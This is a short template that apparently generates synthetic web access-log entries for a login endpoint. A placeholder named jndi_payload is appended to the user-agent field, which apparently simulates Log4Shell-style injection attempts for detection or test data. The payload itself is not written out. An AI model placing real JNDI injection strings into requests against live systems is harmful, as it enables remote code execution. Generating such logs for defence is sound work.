{% set bytes_sent = random_int(1000, 5000) %}

{{ source_ip }} - - [{{ timestamp | format_timestamp('%d/%b/%Y:%H:%M:%S %z') }}] "GET /api/login HTTP/1.1" {{ status_code }} {{ bytes_sent }} "-" "{{ user_agent }} {{ jndi_payload }}"